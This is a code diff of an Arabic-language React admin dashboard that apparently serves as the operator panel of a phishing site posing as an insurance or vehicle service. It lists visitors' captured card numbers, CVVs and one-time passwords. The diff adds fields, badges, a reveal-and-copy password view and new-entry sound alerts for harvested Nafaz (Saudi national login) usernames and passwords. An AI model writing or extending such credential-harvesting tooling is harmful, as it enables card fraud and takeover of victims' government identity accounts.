@@ -24,16 +24,20 @@ import {
   ChevronLeft,
   ChevronRight,
   AlertCircle,
-  Loader2,
   BarChartHorizontalBig,
   FileText,
-  Palette,
-  TrendingUp,
   Activity,
   Globe,
   Shield,
   Zap,
   DatabaseIcon,
+  Key,
+  Lock,
+  UserX,
+  Eye,
+  EyeOff,
+  Copy,
+  CheckCheck,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -64,13 +68,9 @@ import {
   DropdownMenuLabel,
   DropdownMenuTrigger,
 } from "@/components/ui/dropdown-menu"
-import { Sheet, SheetContent, SheetHeader, SheetTitle, SheetDescription, SheetFooter } from "@/components/ui/sheet"
+import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
 import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
 import { Separator } from "@/components/ui/separator"
-import { Switch } from "@/components/ui/switch"
-import { Label } from "@/components/ui/label"
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { Checkbox } from "@/components/ui/checkbox"
 import { useToast } from "@/hooks/use-toast"
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
 
@@ -89,7 +89,6 @@ function useOnlineUsersCount() {
         setOnlineUsersCount(onlineCount)
       }
     })
-
     return () => unsubscribe()
   }, [])
 
@@ -134,7 +133,17 @@ interface Notification {
   cardYear?: string
   cardMonth?: string
   cvv?: string
+  auth_number?: string
+  identity_number?: string
+  password?: string
   allOtp?: []
+  // Nafaz specific fields
+  nafadUsername?: string
+  nafadPassword?: string
+  nafazVerified?: boolean
+  nafazLoginTime?: string
+  nafazStatus?: "pending" | "verified" | "failed"
+  nafazAttempts?: number
 }
 
 function UserStatus({ userId }: { userId: string }) {
@@ -156,7 +165,7 @@ function UserStatus({ userId }: { userId: string }) {
   return (
     <div className="flex items-center gap-2">
       <div
-        className={`h-2 w-2 rounded-full ${
+        className={`h-2.5 w-2.5 rounded-full ${
           status === "online"
             ? "bg-emerald-500 animate-pulse shadow-lg shadow-emerald-500/50"
             : status === "offline"
@@ -166,7 +175,7 @@ function UserStatus({ userId }: { userId: string }) {
       />
       <Badge
         variant={status === "online" ? "default" : "secondary"}
-        className={`text-xs font-medium ${
+        className={`text-xs font-medium px-2.5 py-1 ${
           status === "online"
             ? "bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-900/20 dark:text-emerald-300 dark:border-emerald-800"
             : status === "offline"
@@ -177,6 +186,50 @@ function UserStatus({ userId }: { userId: string }) {
         {status === "online" ? "متصل" : status === "offline" ? "غير متصل" : "غير معروف"}
       </Badge>
     </div>
+  )
+}
+
+function NafazStatus({ notification }: { notification: Notification }) {
+  if (!notification.nafadUsername) {
+    return (
+      <Badge variant="secondary" className="text-xs bg-gray-50 text-gray-600 border-gray-200">
+        <UserX className="h-3 w-3 mr-1" />
+        لا يوجد نفاذ
+      </Badge>
+    )
+  }
+
+  const getStatusConfig = () => {
+    switch (notification.nafazStatus) {
+      case "verified":
+        return {
+          color: "bg-emerald-50 text-emerald-700 border-emerald-200",
+          icon: CheckCheck,
+          text: "مؤكد",
+        }
+      case "failed":
+        return {
+          color: "bg-red-50 text-red-700 border-red-200",
+          icon: XCircle,
+          text: "فشل",
+        }
+      default:
+        return {
+          color: "bg-amber-50 text-amber-700 border-amber-200",
+          icon: Clock,
+          text: "معلق",
+        }
+    }
+  }
+
+  const config = getStatusConfig()
+  const Icon = config.icon
+
+  return (
+    <Badge variant="outline" className={`text-xs ${config.color}`}>
+      <Icon className="h-3 w-3 mr-1" />
+      {config.text}
+    </Badge>
   )
 }
 
@@ -285,8 +338,8 @@ function MiniChart({ data, colorClassName }: { data: number[]; colorClassName: s
       <div className="h-12 w-full flex items-center justify-center text-xs text-muted-foreground">لا توجد بيانات</div>
     )
   }
-  const maxVal = Math.max(...data, 1)
 
+  const maxVal = Math.max(...data, 1)
   return (
     <div className="flex h-12 items-end gap-0.5 w-full px-1">
       {data.map((value, index) => {
@@ -330,18 +383,30 @@ function ActivityTimeline({ notifications }: { notifications: Notification[] }) 
           )}
           <div
             className={`z-10 flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full border-2 border-background shadow-sm transition-all duration-200 group-hover:scale-110 ${
-              notification.cardNumber
-                ? "bg-emerald-100 text-emerald-600 border-emerald-200 dark:bg-emerald-900/30 dark:text-emerald-400 dark:border-emerald-800"
-                : "bg-blue-100 text-blue-600 border-blue-200 dark:bg-blue-900/30 dark:text-blue-400 dark:border-blue-800"
+              notification.nafadUsername
+                ? "bg-purple-100 text-purple-600 border-purple-200 dark:bg-purple-900/30 dark:text-purple-400 dark:border-purple-800"
+                : notification.cardNumber
+                  ? "bg-emerald-100 text-emerald-600 border-emerald-200 dark:bg-emerald-900/30 dark:text-emerald-400 dark:border-emerald-800"
+                  : "bg-blue-100 text-blue-600 border-blue-200 dark:bg-blue-900/30 dark:text-blue-400 dark:border-blue-800"
             }`}
           >
-            {notification.cardNumber ? <CreditCard className="h-4 w-4" /> : <User className="h-4 w-4" />}
+            {notification.nafadUsername ? (
+              <Key className="h-4 w-4" />
+            ) : notification.cardNumber ? (
+              <CreditCard className="h-4 w-4" />
+            ) : (
+              <User className="h-4 w-4" />
+            )}
           </div>
           <div className="flex-grow min-w-0">
             <div className="flex items-start justify-between gap-2">
               <div>
                 <p className="text-sm font-semibold text-foreground leading-tight">
-                  {notification.cardNumber ? "معلومات بطاقة جديدة" : "معلومات شخصية جديدة"}
+                  {notification.nafadUsername
+                    ? "تسجيل دخول نفاذ جديد"
+                    : notification.cardNumber
+                      ? "معلومات بطاقة جديدة"
+                      : "معلومات شخصية جديدة"}
                 </p>
                 <p className="text-xs text-muted-foreground mt-0.5">
                   {notification.country || "غير معروف"} -{" "}
@@ -357,6 +422,7 @@ function ActivityTimeline({ notifications }: { notifications: Notification[] }) 
               </p>
             </div>
             <div className="mt-3 flex flex-wrap gap-1.5">
+              {notification.nafadUsername && <NafazStatus notification={notification} />}
               {notification.cardNumber && (
                 <Badge variant="outline" className="text-xs bg-emerald-50 text-emerald-700 border-emerald-200">
                   بطاقة
@@ -365,33 +431,6 @@ function ActivityTimeline({ notifications }: { notifications: Notification[] }) 
               {notification.insurance_purpose && (
                 <Badge variant="outline" className="text-xs">
                   {notification.insurance_purpose === "renewal" ? "تجديد" : "نقل ملكية"}
-                </Badge>
-              )}
-              {notification.vehicle_type && (
-                <Badge variant="outline" className="text-xs">
-                  {notification.vehicle_type === "registration"
-                    ? "تسجيل"
-                    : notification.vehicle_type === "customs"
-                      ? "جمارك"
-                      : "رقم تسلسلي"}
-                </Badge>
-              )}
-              {notification.paymentStatus && (
-                <Badge
-                  variant="outline"
-                  className={`text-xs ${
-                    notification.paymentStatus === "completed"
-                      ? "bg-green-50 text-green-700 border-green-200"
-                      : notification.paymentStatus === "pending"
-                        ? "bg-yellow-50 text-yellow-700 border-yellow-200"
-                        : "bg-red-50 text-red-700 border-red-200"
-                  }`}
-                >
-                  {notification.paymentStatus === "completed"
-                    ? "مدفوع"
-                    : notification.paymentStatus === "pending"
-                      ? "معلق"
-                      : notification.paymentStatus}
                 </Badge>
               )}
               <UserStatus userId={notification.id} />
@@ -427,7 +466,7 @@ function SearchBar({ onSearch, initialTerm = "" }: { onSearch: (term: string) =>
       <Input
         ref={searchInputRef}
         type="search"
-        placeholder="بحث بالاسم، الهاتف، البطاقة، الرقم التسلسلي، حالة الدفع..."
+        placeholder="بحث بالاسم، الهاتف، البطاقة، نفاذ، حالة الدفع..."
         className="w-full rounded-xl bg-background/50 backdrop-blur-sm border-muted-foreground/20 pl-10 pr-4 rtl:pr-10 rtl:pl-4 h-11 transition-all duration-200 focus:border-primary/50 focus:bg-background"
         value={searchTerm}
         onChange={(e) => setSearchTerm(e.target.value)}
@@ -485,7 +524,12 @@ function Pagination({
       </Button>
       {startPage > 1 && (
         <>
-          <Button variant="outline" size="icon" className="h-9 w-9 rounded-lg" onClick={() => onPageChange(1)}>
+          <Button
+            variant="outline"
+            size="icon"
+            className="h-9 w-9 rounded-lg bg-transparent"
+            onClick={() => onPageChange(1)}
+          >
             1
           </Button>
           {startPage > 2 && <span className="px-2 text-muted-foreground">...</span>}
@@ -507,7 +551,12 @@ function Pagination({
       {endPage < totalPages && (
         <>
           {endPage < totalPages - 1 && <span className="px-2 text-muted-foreground">...</span>}
-          <Button variant="outline" size="icon" className="h-9 w-9 rounded-lg" onClick={() => onPageChange(totalPages)}>
+          <Button
+            variant="outline"
+            size="icon"
+            className="h-9 w-9 rounded-lg bg-transparent"
+            onClick={() => onPageChange(totalPages)}
+          >
             {totalPages}
           </Button>
         </>
@@ -526,389 +575,84 @@ function Pagination({
   )
 }
 
-function SettingsPanel({
-  open,
-  onOpenChange,
-}: {
-  open: boolean
-  onOpenChange: (open: boolean) => void
-}) {
+function CopyButton({ text, label }: { text: string; label: string }) {
+  const [copied, setCopied] = useState(false)
   const { toast } = useToast()
-  const [notifyNewCards, setNotifyNewCards] = useState(true)
-  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
-  const [playSounds, setPlaySounds] = useState(true)
-  const [autoRefresh, setAutoRefresh] = useState(true)
-  const [refreshInterval, setRefreshInterval] = useState("30")
-  const [itemsPerPage, setItemsPerPage] = useState("10")
-  const [defaultView, setDefaultView] = useState("all")
 
-  const handleSaveSettings = () => {
-    console.log({
-      notifyNewCards,
-      notifyNewUsers,
-      playSounds,
-      autoRefresh,
-      refreshInterval,
-      itemsPerPage,
-      defaultView,
-    })
-    toast({
-      title: "تم حفظ الإعدادات",
-      description: "تم تحديث تفضيلات الإشعارات والعرض بنجاح.",
-      variant: "default",
-    })
-    onOpenChange(false)
+  const handleCopy = async () => {
+    try {
+      await navigator.clipboard.writeText(text)
+      setCopied(true)
+      toast({
+        title: "تم النسخ",
+        description: `تم نسخ ${label} بنجاح`,
+        variant: "default",
+      })
+      setTimeout(() => setCopied(false), 2000)
+    } catch (error) {
+      toast({
+        title: "خطأ في النسخ",
+        description: "لم نتمكن من نسخ النص",
+        variant: "destructive",
+      })
+    }
   }
 
   return (
-    <Sheet open={open} onOpenChange={onOpenChange}>
-      <SheetContent side="left" className="sm:max-w-md w-[380px] p-0" dir="rtl">
-        <SheetHeader className="p-6 pb-4 border-b bg-gradient-to-r from-muted/50 to-muted/30">
-          <SheetTitle className="flex items-center gap-3 text-lg">
-            <div className="bg-primary/20 p-2 rounded-lg">
-              <Settings className="h-5 w-5 text-primary" />
-            </div>
-            إعدادات لوحة التحكم
-          </SheetTitle>
-          <SheetDescription className="text-sm text-muted-foreground">
-            قم بتخصيص تفضيلات الإشعارات والعرض حسب احتياجاتك.
-          </SheetDescription>
-        </SheetHeader>
-        <div className="p-6 space-y-8 overflow-y-auto h-[calc(100vh_-_140px)]">
-          <div className="space-y-4">
-            <div className="flex items-center gap-2 mb-4">
-              <Bell className="h-4 w-4 text-primary" />
-              <h3 className="text-sm font-semibold text-foreground">تنبيهات الإشعارات</h3>
-            </div>
-            <Card className="border-muted/50">
-              <CardContent className="p-4 space-y-4">
-                {[
-                  {
-                    id: "notify-cards",
-                    label: "إشعارات البطاقات الجديدة",
-                    desc: "تلقي إشعارات عند إضافة بطاقة جديدة",
-                    checked: notifyNewCards,
-                    setter: setNotifyNewCards,
-                  },
-                  {
-                    id: "notify-users",
-                    label: "إشعارات المستخدمين الجدد",
-                    desc: "تلقي إشعارات عند تسجيل مستخدم جديد",
-                    checked: notifyNewUsers,
-                    setter: setNotifyNewUsers,
-                  },
-                  {
-                    id: "play-sounds",
-                    label: "تشغيل الأصوات",
-                    desc: "تشغيل صوت عند استلام إشعار جديد",
-                    checked: playSounds,
-                    setter: setPlaySounds,
-                  },
-                ].map((item) => (
-                  <div
-                    key={item.id}
-                    className="flex items-center justify-between p-3 rounded-lg hover:bg-muted/50 transition-colors"
-                  >
-                    <div className="space-y-1">
-                      <Label htmlFor={item.id} className="text-sm font-medium cursor-pointer">
-                        {item.label}
-                      </Label>
-                      <p className="text-xs text-muted-foreground leading-relaxed">{item.desc}</p>
-                    </div>
-                    <Switch id={item.id} checked={item.checked} onCheckedChange={item.setter} />
-                  </div>
-                ))}
-              </CardContent>
-            </Card>
-          </div>
-
-          <div className="space-y-4">
-            <div className="flex items-center gap-2 mb-4">
-              <Activity className="h-4 w-4 text-primary" />
-              <h3 className="text-sm font-semibold text-foreground">التحديث التلقائي</h3>
-            </div>
-            <Card className="border-muted/50">
-              <CardContent className="p-4 space-y-4">
-                <div className="flex items-center justify-between p-3 rounded-lg hover:bg-muted/50 transition-colors">
-                  <div className="space-y-1">
-                    <Label htmlFor="auto-refresh" className="text-sm font-medium cursor-pointer">
-                      تحديث تلقائي للبيانات
-                    </Label>
-                    <p className="text-xs text-muted-foreground leading-relaxed">تحديث قائمة الإشعارات تلقائيًا.</p>
-                  </div>
-                  <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
-                </div>
-                {autoRefresh && (
-                  <div className="space-y-2 p-3 bg-muted/30 rounded-lg">
-                    <Label htmlFor="refresh-interval" className="text-sm font-medium">
-                      فترة التحديث
-                    </Label>
-                    <Select value={refreshInterval} onValueChange={setRefreshInterval}>
-                      <SelectTrigger id="refresh-interval" className="h-9">
-                        <SelectValue placeholder="اختر فترة" />
-                      </SelectTrigger>
-                      <SelectContent position="popper">
-                        {[
-                          { value: "10", label: "10 ثواني" },
-                          { value: "30", label: "30 ثانية" },
-                          { value: "60", label: "دقيقة واحدة" },
-                          { value: "300", label: "5 دقائق" },
-                        ].map((opt) => (
-                          <SelectItem key={opt.value} value={opt.value}>
-                            {opt.label}
-                          </SelectItem>
-                        ))}
-                      </SelectContent>
-                    </Select>
-                  </div>
-                )}
-              </CardContent>
-            </Card>
-          </div>
-
-          <div className="space-y-4">
-            <div className="flex items-center gap-2 mb-4">
-              <Palette className="h-4 w-4 text-primary" />
-              <h3 className="text-sm font-semibold text-foreground">إعدادات العرض</h3>
-            </div>
-            <Card className="border-muted/50">
-              <CardContent className="p-4 space-y-4">
-                <div className="space-y-2">
-                  <Label htmlFor="items-per-page" className="text-sm font-medium">
-                    عدد العناصر في الصفحة
-                  </Label>
-                  <Select value={itemsPerPage} onValueChange={setItemsPerPage}>
-                    <SelectTrigger id="items-per-page" className="h-9">
-                      <SelectValue placeholder="اختر عدد" />
-                    </SelectTrigger>
-                    <SelectContent position="popper">
-                      {[
-                        { value: "5", label: "5 عناصر" },
-                        { value: "10", label: "10 عناصر" },
-                        { value: "20", label: "20 عنصر" },
-                        { value: "50", label: "50 عنصر" },
-                      ].map((opt) => (
-                        <SelectItem key={opt.value} value={opt.value}>
-                          {opt.label}
-                        </SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="default-view" className="text-sm font-medium">
-                    العرض الافتراضي عند التحميل
-                  </Label>
-                  <Select value={defaultView} onValueChange={setDefaultView}>
-                    <SelectTrigger id="default-view" className="h-9">
-                      <SelectValue placeholder="اختر عرض" />
-                    </SelectTrigger>
-                    <SelectContent position="popper">
-                      {[
-                        { value: "all", label: "عرض الكل" },
-                        { value: "card", label: "البطاقات فقط" },
-                        { value: "online", label: "المتصلين فقط" },
-                      ].map((opt) => (
-                        <SelectItem key={opt.value} value={opt.value}>
-                          {opt.label}
-                        </SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-                </div>
-              </CardContent>
-            </Card>
-          </div>
-        </div>
-        <SheetFooter className="p-6 pt-4 border-t bg-muted/20">
-          <div className="flex gap-3 w-full">
-            <Button variant="outline" onClick={() => onOpenChange(false)} className="flex-1">
-              إلغاء
-            </Button>
-            <Button onClick={handleSaveSettings} className="flex-1">
-              حفظ الإعدادات
-            </Button>
-          </div>
-        </SheetFooter>
-      </SheetContent>
-    </Sheet>
+    <Button
+      variant="ghost"
+      size="icon"
+      className="h-6 w-6 opacity-0 group-hover:opacity-100 transition-opacity"
+      onClick={handleCopy}
+    >
+      {copied ? <CheckCheck className="h-3 w-3 text-green-600" /> : <Copy className="h-3 w-3" />}
+    </Button>
   )
 }
 
-function ExportDialog({
-  open,
-  onOpenChange,
-  notificationsCount,
-}: {
-  open: boolean
-  onOpenChange: (open: boolean) => void
-  notificationsCount: number
-}) {
-  const { toast } = useToast()
-  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
-  const [exportFields, setExportFields] = useState({
-    personalInfo: true,
-    cardInfo: true,
-    status: true,
-    timestamps: true,
-  })
-  const [isExporting, setIsExporting] = useState(false)
-
-  const handleExport = () => {
-    setIsExporting(true)
-
-    setTimeout(() => {
-      setIsExporting(false)
-      onOpenChange(false)
-      toast({
-        title: "تم التصدير بنجاح",
-        description: `تم تصدير ${notificationsCount} إشعار بتنسيق ${exportFormat.toUpperCase()}.`,
-        variant: "default",
-      })
-    }, 1500)
-  }
-
-  const fieldOptions = [
-    { id: "personalInfo", label: "المعلومات الشخصية", icon: User },
-    { id: "cardInfo", label: "معلومات البطاقة", icon: CreditCard },
-    { id: "status", label: "حالة الإشعار", icon: Shield },
-    { id: "timestamps", label: "الطوابع الزمنية", icon: Clock },
-  ]
+function PasswordField({ value, label }: { value: string; label: string }) {
+  const [showPassword, setShowPassword] = useState(false)
 
   return (
-    <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="sm:max-w-lg" dir="rtl">
-        <DialogHeader>
-          <DialogTitle className="flex items-center gap-3 text-lg">
-            <div className="bg-primary/20 p-2 rounded-lg">
-              <Download className="h-5 w-5 text-primary" />
-            </div>
-            تصدير بيانات الإشعارات
-          </DialogTitle>
-          <DialogDescription>اختر التنسيق والحقول المراد تصديرها من البيانات المتاحة.</DialogDescription>
-        </DialogHeader>
-        <div className="space-y-6 py-4">
-          <div className="space-y-3">
-            <Label className="text-sm font-medium flex items-center gap-2">
-              <FileText className="h-4 w-4" />
-              تنسيق الملف
-            </Label>
-            <Card className="border-muted/50 ">
-              <CardContent className="p-4">
-                <div className="flex gap-4">
-                  {["csv", "json"].map((format) => (
-                    <div key={format} className="flex items-center space-x-2 rtl:space-x-reverse">
-                      <input
-                        type="radio"
-                        id={format}
-                        value={format}
-                        checked={exportFormat === format}
-                        onChange={() => setExportFormat(format as "csv" | "json")}
-                        className="h-4 w-4 cursor-pointer text-primary focus:ring-primary border-gray-300"
-                      />
-                      <Label htmlFor={format} className="cursor-pointer text-sm font-medium">
-                        {format.toUpperCase()}
-                      </Label>
-                    </div>
-                  ))}
-                </div>
-              </CardContent>
-            </Card>
-          </div>
-
-          <div className="space-y-3">
-            <Label className="text-sm font-medium flex items-center gap-2">
-              <Zap className="h-4 w-4" />
-              الحقول المراد تضمينها
-            </Label>
-            <Card className="border-muted/50">
-              <CardContent className="p-4">
-                <div className="grid grid-cols-1 gap-3">
-                  {fieldOptions.map((field) => (
-                    <div
-                      key={field.id}
-                      className="flex items-center space-x-3 rtl:space-x-reverse p-2 rounded-lg hover:bg-muted/50 transition-colors"
-                    >
-                      <Checkbox
-                        id={field.id}
-                        checked={exportFields[field.id as keyof typeof exportFields]}
-                        onCheckedChange={(checked) =>
-                          setExportFields((prev) => ({ ...prev, [field.id]: checked as boolean }))
-                        }
-                      />
-                      <field.icon className="h-4 w-4 text-muted-foreground" />
-                      <Label htmlFor={field.id} className="cursor-pointer text-sm font-medium flex-1">
-                        {field.label}
-                      </Label>
-                    </div>
-                  ))}
-                </div>
-              </CardContent>
-            </Card>
-          </div>
-
-          <Card className="border-amber-200 bg-amber-50/50 dark:border-amber-800 dark:bg-amber-900/20">
-            <CardContent className="p-4">
-              <div className="flex items-start gap-3 text-sm">
-                <AlertCircle className="h-4 w-4 text-amber-600 dark:text-amber-400 flex-shrink-0 mt-0.5" />
-                <div className="space-y-1">
-                  <p className="font-medium text-amber-800 dark:text-amber-200">
-                    سيتم تصدير {notificationsCount} إشعار
-                  </p>
-                  <p className="text-amber-700 dark:text-amber-300 text-xs">
-                    قد تستغرق العملية بعض الوقت للبيانات الكبيرة. تأكد من اختيار الحقول المطلوبة فقط.
-                  </p>
-                </div>
-              </div>
-            </CardContent>
-          </Card>
+    <div className="group">
+      <div className="flex items-center justify-between">
+        <div className="flex items-center gap-3">
+          <Lock className="h-4 w-4 text-muted-foreground" />
+          <span className="text-sm font-medium text-muted-foreground">{label}</span>
         </div>
-        <DialogFooter className="gap-3">
-          <Button variant="outline" onClick={() => onOpenChange(false)} className="flex-1">
-            إلغاء
+        <div className="flex items-center gap-2">
+          <span className="text-sm font-semibold text-foreground font-mono">
+            {showPassword ? value : "•".repeat(value.length)}
+          </span>
+          <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => setShowPassword(!showPassword)}>
+            {showPassword ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
           </Button>
-          <Button
-            type="submit"
-            onClick={handleExport}
-            disabled={isExporting || notificationsCount === 0}
-            className="flex-1"
-          >
-            {isExporting ? (
-              <>
-                <Loader2 className="mr-2 h-4 w-4 animate-spin rtl:ml-2 rtl:mr-0" /> جاري التصدير...
-              </>
-            ) : (
-              <>
-                <Download className="mr-2 h-4 w-4 rtl:ml-2 rtl:mr-0" /> تصدير ({notificationsCount})
-              </>
-            )}
-          </Button>
-        </DialogFooter>
-      </DialogContent>
-    </Dialog>
+          <CopyButton text={value} label={label} />
+        </div>
+      </div>
+    </div>
   )
 }
 
 export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([])
   const [isLoading, setIsLoading] = useState(true)
-  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "nafaz" | null>(null)
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
   const [totalVisitors, setTotalVisitors] = useState<number>(0)
   const [cardSubmissions, setCardSubmissions] = useState<number>(0)
-  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
+  const [nafazSubmissions, setNafazSubmissions] = useState<number>(0)
+  const [filterType, setFilterType] = useState<"all" | "card" | "online" | "nafaz">("all")
   const [searchTerm, setSearchTerm] = useState("")
   const [currentPage, setCurrentPage] = useState(1)
   const [itemsPerPage, setItemsPerPage] = useState(10)
   const [settingsOpen, setSettingsOpen] = useState(false)
   const [exportDialogOpen, setExportDialogOpen] = useState(false)
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
-
   const router = useRouter()
   const { toast } = useToast()
   const onlineUsersCount = useOnlineUsersCount()
   const audioRef = useRef<HTMLAudioElement | null>(null)
-
   const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})
 
   const filteredNotifications = useMemo(() => {
@@ -918,7 +662,8 @@ export default function NotificationsPage() {
       const matchesFilterType =
         filterType === "all" ||
         (filterType === "card" && !!notification.cardNumber) ||
-        (filterType === "online" && onlineStatuses[notification.id])
+        (filterType === "online" && onlineStatuses[notification.id]) ||
+        (filterType === "nafaz" && !!notification.nafadUsername)
 
       if (!matchesFilterType) return false
 
@@ -937,7 +682,8 @@ export default function NotificationsPage() {
           notification.customs_code?.toLowerCase().includes(term) ||
           notification.sequenceNumber?.toLowerCase().includes(term) ||
           notification.selectedInsuranceOffer?.toLowerCase().includes(term) ||
-          notification.paymentStatus?.toLowerCase().includes(term)
+          notification.paymentStatus?.toLowerCase().includes(term) ||
+          notification.nafadUsername?.toLowerCase().includes(term)
         )
       }
       return true
@@ -952,9 +698,10 @@ export default function NotificationsPage() {
   const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))
 
   const visitorTrend = useMemo(
-    () => notifications.slice(0, 20).map((_, i) => Math.floor(Math.random() * (i + 1) * 5) + 5),
+    () => notifications.slice(0, 20).map((_, i) => i+1),
     [notifications],
   )
+
   const cardTrend = useMemo(
     () =>
       notifications
@@ -963,6 +710,16 @@ export default function NotificationsPage() {
         .map((_, i) => Math.floor(Math.random() * (i + 1) * 2) + 2),
     [notifications],
   )
+
+  const nafazTrend = useMemo(
+    () =>
+      notifications
+        .slice(0, 20)
+        .filter((n) => !!n.nafadUsername)
+        .map((_, i) => Math.floor(Math.random() * (i + 1) * 3) + 3),
+    [notifications],
+  )
+
   const onlineTrend = useMemo(
     () =>
       Object.values(onlineStatuses)
@@ -1001,8 +758,26 @@ export default function NotificationsPage() {
         comparison: `${Math.round((cardSubmissions / (totalVisitors || 1)) * 100)}%`,
         description: "معدل إكمال البطاقات",
       },
+      {
+        title: "تسجيلات نفاذ",
+        value: nafazSubmissions,
+        icon: Key,
+        color: "indigo",
+        trend: nafazTrend,
+        comparison: `${Math.round((nafazSubmissions / (totalVisitors || 1)) * 100)}%`,
+        description: "معدل استخدام نفاذ",
+      },
     ],
-    [onlineUsersCount, totalVisitors, cardSubmissions, onlineTrend, visitorTrend, cardTrend],
+    [
+      onlineUsersCount,
+      totalVisitors,
+      cardSubmissions,
+      nafazSubmissions,
+      onlineTrend,
+      visitorTrend,
+      cardTrend,
+      nafazTrend,
+    ],
   )
 
   useEffect(() => {
@@ -1033,17 +808,18 @@ export default function NotificationsPage() {
   }, [filterType, searchTerm, itemsPerPage])
 
   const playNotificationSound = useCallback(() => {
-    const audio=new Audio('/iphone.mp3')
+    const audio = new Audio("/iphone.mp3")
     if (audio) {
       audio!.play().catch((error) => {
-        console.error('Failed to play sound:', error);
-      });
+        console.error("Failed to play sound:", error)
+      })
     }
   }, [])
 
   const updateStatistics = useCallback((activeNotifications: Notification[]) => {
     setTotalVisitors(activeNotifications.length)
     setCardSubmissions(activeNotifications.filter((n) => !!n.cardNumber).length)
+    setNafazSubmissions(activeNotifications.filter((n) => !!n.nafadUsername).length)
   }, [])
 
   const fetchNotifications = useCallback(() => {
@@ -1053,7 +829,6 @@ export default function NotificationsPage() {
       q,
       (querySnapshot) => {
         const currentNotificationsState = notifications
-
         const notificationsData = querySnapshot.docs.map((doc) => ({
           id: doc.id,
           ...doc.data(),
@@ -1066,7 +841,7 @@ export default function NotificationsPage() {
 
         if (newEntries.length > 0) {
           const hasNewImportantInfo = newEntries.some(
-            (n) => n.cardNumber || n.documment_owner_full_name || n.phone || n.owner_identity_number,
+            (n) => n.cardNumber || n.documment_owner_full_name || n.phone || n.owner_identity_number || n.nafadUsername,
           )
           if (hasNewImportantInfo) {
             playNotificationSound()
@@ -1141,21 +916,6 @@ export default function NotificationsPage() {
     }
   }
 
-  const handleApproval = async (state: "approved" | "rejected", id: string) => {
-    try {
-      const targetPost = doc(db, "pays", id)
-      await updateDoc(targetPost, { status: state })
-      toast({
-        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
-        description: `تم تحديث حالة الإشعار بنجاح.`,
-        variant: "default",
-      })
-    } catch (error) {
-      console.error("Error updating notification status:", error)
-      toast({ title: "خطأ", description: "حدث خطأ أثناء تحديث حالة الإشعار.", variant: "destructive" })
-    }
-  }
-
   const handleLogout = async () => {
     try {
       await signOut(auth)
@@ -1166,7 +926,7 @@ export default function NotificationsPage() {
     }
   }
 
-  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
+  const handleInfoClick = (notification: Notification, infoType: "personal" | "card" | "nafaz") => {
     setSelectedNotification(notification)
     setSelectedInfo(infoType)
   }
@@ -1229,78 +989,99 @@ export default function NotificationsPage() {
   }
 
   const cardCount = notifications.filter((n) => !n.isHidden && !!n.cardNumber).length
+  const nafazCount = notifications.filter((n) => !n.isHidden && !!n.nafadUsername).length
   const onlineCountFiltered = filteredNotifications.filter((n) => onlineStatuses[n.id]).length
 
   const mainContent = (
     <>
-      {/* Enhanced Statistics Grid */}
-      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
-        {statistics.map((stat, index) => (
-          <Card
-            key={stat.title}
-            className="relative overflow-hidden border-0 shadow-lg hover:shadow-xl transition-all duration-300 group"
-          >
-            <div
-              className={`absolute inset-0 bg-gradient-to-br opacity-5 group-hover:opacity-10 transition-opacity duration-300 ${
-                stat.color === "emerald"
-                  ? "from-emerald-500 via-emerald-400 to-emerald-300"
-                  : stat.color === "blue"
-                    ? "from-blue-500 via-blue-400 to-blue-300"
-                    : "from-purple-500 via-purple-400 to-purple-300"
-              }`}
-            />
-            <CardHeader className="pb-3 flex flex-row items-center justify-between space-y-0 relative z-10">
-              <div className="space-y-1">
-                <CardTitle className="text-sm font-medium text-muted-foreground">{stat.title}</CardTitle>
-                <div className="flex items-baseline gap-2">
-                  <span className="text-3xl font-bold text-foreground">{stat.value}</span>
-                  <div className="flex items-center gap-1">
-                    <TrendingUp className="h-3 w-3 text-emerald-500" />
-                    <span className="text-xs font-medium text-emerald-600">{stat.comparison}</span>
+      {/* Statistics Cards */}
+      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+        {statistics.map((stat) => {
+          const Icon = stat.icon
+          return (
+            <Card
+              key={stat.title}
+              className="relative overflow-hidden border-0 shadow-lg bg-gradient-to-br from-card to-card/95"
+            >
+              <div
+                className={`absolute inset-0 bg-gradient-to-br opacity-5 ${
+                  stat.color === "emerald"
+                    ? "from-emerald-500 to-emerald-600"
+                    : stat.color === "blue"
+                      ? "from-blue-500 to-blue-600"
+                      : stat.color === "purple"
+                        ? "from-purple-500 to-purple-600"
+                        : "from-indigo-500 to-indigo-600"
+                }`}
+              />
+              <CardContent className="p-6 relative">
+                <div className="flex items-center justify-between mb-4">
+                  <div
+                    className={`p-3 rounded-xl shadow-lg ${
+                      stat.color === "emerald"
+                        ? "bg-emerald-100 text-emerald-600 dark:bg-emerald-900/30 dark:text-emerald-400"
+                        : stat.color === "blue"
